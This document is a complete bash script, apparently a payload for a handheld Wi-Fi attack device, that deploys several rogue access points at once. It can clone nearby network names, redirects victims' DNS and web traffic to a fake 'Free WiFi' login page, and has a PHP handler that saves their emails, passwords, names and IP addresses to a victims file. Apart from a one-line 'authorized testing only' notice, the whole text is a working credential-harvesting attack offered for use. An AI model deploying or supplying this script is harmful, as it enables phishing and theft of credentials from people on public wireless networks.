#!/bin/bash
# Title: Rogue AP Matrix
# Author: bad-antics
# Description: Deploy multiple simultaneous rogue APs with different attack profiles
# Category: nullsec/attack
# Version: 1.0.0

LOOT_DIR="/mmc/nullsec/rogue_matrix"
LOG_FILE="$LOOT_DIR/matrix.log"
VICTIMS_FILE="$LOOT_DIR/victims.txt"

mkdir -p "$LOOT_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

PROMPT "🕸️ ROGUE AP MATRIX

Deploy multiple attack APs
simultaneously:

• Evil Twin clones
• Honeypot networks
• Captive portals
• Credential harvesters

Multi-interface required
for maximum coverage.

⚠️ Authorized testing only!"

# Detect available interfaces
INTERFACES=($(iw dev | grep Interface | awk '{print $2}'))
IFACE_COUNT=${#INTERFACES[@]}

if [ "$IFACE_COUNT" -lt 2 ]; then
    ERROR_DIALOG "Need 2+ WiFi interfaces!
    
Found: $IFACE_COUNT
Required: 2+

Connect additional adapters."
    exit 1
fi

PROMPT "Found $IFACE_COUNT interfaces:
$(printf '%s\n' "${INTERFACES[@]}")

Each will run a different
attack profile."

# Kill interfering processes
airmon-ng check kill &>/dev/null

# Attack profiles
declare -A PROFILES
PROFILES[honeypot]="Free_WiFi|open|portal"
PROFILES[corporate]="CorpGuest|wpa2|creds"
PROFILES[hotel]="Hotel_WiFi|open|portal"
PROFILES[airport]="Airport_Free|open|inject"

# Select profiles
SELECTED_PROFILES=()
DIALOG "Select attack profiles:

[1] Free_WiFi Honeypot
[2] Corporate Guest
[3] Hotel_WiFi Clone
[4] Airport Free WiFi
[5] Custom SSID
[6] Scan & Clone nearby" CHOICE

case $CHOICE in
    1) SELECTED_PROFILES+=("honeypot") ;;
    2) SELECTED_PROFILES+=("corporate") ;;
    3) SELECTED_PROFILES+=("hotel") ;;
    4) SELECTED_PROFILES+=("airport") ;;
    5) 
        KEYBOARD "Enter custom SSID:" CUSTOM_SSID
        PROFILES[custom]="$CUSTOM_SSID|open|portal"
        SELECTED_PROFILES+=("custom")
        ;;
    6)
        # Scan for nearby networks
        SPINNER_START "Scanning nearby networks..."
        airodump-ng ${INTERFACES[0]} -w /tmp/matrix_scan --write-interval 1 --output-format csv &
        SCAN_PID=$!
        sleep 15
        kill $SCAN_PID 2>/dev/null
        SPINNER_STOP
        
        # Parse top networks
        NEARBY=$(grep -E "^([0-9A-Fa-f]{2}:){5}" /tmp/matrix_scan*.csv 2>/dev/null | head -5 | cut -d',' -f14 | sed 's/^ *//')
        
        i=1
        while read -r ssid; do
            if [ -n "$ssid" ]; then
                PROFILES["nearby$i"]="$ssid|open|portal"
                SELECTED_PROFILES+=("nearby$i")
                ((i++))
            fi
        done <<< "$NEARBY"
        ;;
esac

# Default to all if none selected
if [ ${#SELECTED_PROFILES[@]} -eq 0 ]; then
    SELECTED_PROFILES=("honeypot" "corporate")
fi

# Setup network base
BASE_IP="192.168"
SUBNET=100

# Portal page
mkdir -p /tmp/www
cat > /tmp/www/index.html << 'PORTAL'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); max-width: 400px; width: 90%; }
        h1 { color: #333; margin-bottom: 30px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #667eea; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #5a6fd6; }
        .terms { font-size: 12px; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌐 Free WiFi Access</h1>
        <p>Sign in with your email to connect</p>
        <form method="POST" action="/connect">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password (optional)" >
            <input type="text" name="name" placeholder="Full Name">
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>
PORTAL

# PHP handler for credentials
cat > /tmp/www/connect.php << 'PHP'
<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$name = $_POST['name'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

$log = "$time | $ip | $email | $password | $name | $ua\n";
file_put_contents('/mmc/nullsec/rogue_matrix/victims.txt', $log, FILE_APPEND);

// Redirect to success
header('Location: /success.html');
?>
PHP

cat > /tmp/www/success.html << 'SUCCESS'
<!DOCTYPE html>
<html>
<head>
    <title>Connected!</title>
    <meta http-equiv="refresh" content="3;url=http://www.google.com">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>✓ Connected Successfully!</h1>
    <p>Redirecting you to the internet...</p>
</body>
</html>
SUCCESS

# Start rogue APs
PIDS=()
AP_COUNT=0

SPINNER_START "Deploying rogue AP matrix..."

for i in "${!SELECTED_PROFILES[@]}"; do
    profile="${SELECTED_PROFILES[$i]}"
    iface="${INTERFACES[$i]}"
    
    if [ -z "$iface" ]; then
        continue
    fi
    
    IFS='|' read -r ssid security mode <<< "${PROFILES[$profile]}"
    
    CURRENT_SUBNET=$((SUBNET + i))
    IP="$BASE_IP.$CURRENT_SUBNET.1"
    
    log "Deploying: $ssid on $iface ($IP)"
    
    # Configure interface
    ifconfig $iface up
    ifconfig $iface $IP netmask 255.255.255.0
    
    # Hostapd config
    cat > /tmp/hostapd_$i.conf << EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$((6 + i * 2))
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    if [ "$security" = "wpa2" ]; then
        cat >> /tmp/hostapd_$i.conf << EOF
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    fi
    
    # DHCP config
    cat > /tmp/dnsmasq_$i.conf << EOF
interface=$iface
dhcp-range=$BASE_IP.$CURRENT_SUBNET.100,$BASE_IP.$CURRENT_SUBNET.200,255.255.255.0,12h
dhcp-option=3,$IP
dhcp-option=6,$IP
address=/#/$IP
log-queries
log-dhcp
EOF
    
    # Start services
    hostapd /tmp/hostapd_$i.conf &>/dev/null &
    PIDS+=($!)
    
    dnsmasq -C /tmp/dnsmasq_$i.conf &>/dev/null &
    PIDS+=($!)
    
    ((AP_COUNT++))
    
    log "Started AP #$AP_COUNT: $ssid"
done

# Start web server for portals
php -S 0.0.0.0:80 -t /tmp/www &>/dev/null &
PIDS+=($!)

# Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -F

# Redirect HTTP to portal
for i in "${!SELECTED_PROFILES[@]}"; do
    CURRENT_SUBNET=$((SUBNET + i))
    iptables -t nat -A PREROUTING -s $BASE_IP.$CURRENT_SUBNET.0/24 -p tcp --dport 80 -j DNAT --to-destination $BASE_IP.$CURRENT_SUBNET.1:80
    iptables -t nat -A PREROUTING -s $BASE_IP.$CURRENT_SUBNET.0/24 -p tcp --dport 443 -j DNAT --to-destination $BASE_IP.$CURRENT_SUBNET.1:80
done

SPINNER_STOP

PROMPT "🟢 MATRIX ACTIVE

Deployed $AP_COUNT rogue APs:
$(for p in "${SELECTED_PROFILES[@]}"; do
    IFS='|' read -r s _ _ <<< "${PROFILES[$p]}"
    echo "• $s"
done)

Victims will be redirected
to credential capture portal.

Press OK for live status."

# Monitor loop
VICTIM_COUNT=0
while true; do
    if [ -f "$VICTIMS_FILE" ]; then
        NEW_COUNT=$(wc -l < "$VICTIMS_FILE" 2>/dev/null || echo 0)
        if [ "$NEW_COUNT" -gt "$VICTIM_COUNT" ]; then
            VICTIM_COUNT=$NEW_COUNT
            LED R FAST
            sleep 1
            LED G SOLID
            LATEST=$(tail -1 "$VICTIMS_FILE" | cut -d'|' -f3)
            NOTIFY "New victim: $LATEST"
        fi
    fi
    
    # Connected clients count
    CLIENTS=0
    for iface in "${INTERFACES[@]}"; do
        C=$(iw dev $iface station dump 2>/dev/null | grep -c Station)
        CLIENTS=$((CLIENTS + C))
    done
    
    DIALOG "📊 MATRIX STATUS

Active APs: $AP_COUNT
Connected clients: $CLIENTS
Captured creds: $VICTIM_COUNT

[1] View Victims
[2] Add Custom AP
[3] Stop Matrix" --default-button 1 --timeout 30 STATUS

    case $STATUS in
        1)
            if [ -f "$VICTIMS_FILE" ]; then
                PAGER "$VICTIMS_FILE"
            else
                NOTIFY "No victims yet"
            fi
            ;;
        2)
            KEYBOARD "Enter SSID:" NEW_SSID
            if [ -n "$NEW_SSID" ]; then
                NOTIFY "Would add: $NEW_SSID (restart required)"
            fi
            ;;
        3|timeout|255)
            break
            ;;
    esac
done

# Cleanup
log "Shutting down matrix..."
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null
done

# Reset iptables
iptables -t nat -F
iptables -F

FINAL_COUNT=$(wc -l < "$VICTIMS_FILE" 2>/dev/null || echo 0)

PROMPT "✅ MATRIX SHUTDOWN

Session complete!

Total APs deployed: $AP_COUNT  
Credentials captured: $FINAL_COUNT

Logs: $LOG_FILE
Victims: $VICTIMS_FILE"

log "Matrix shutdown. $FINAL_COUNT credentials captured."
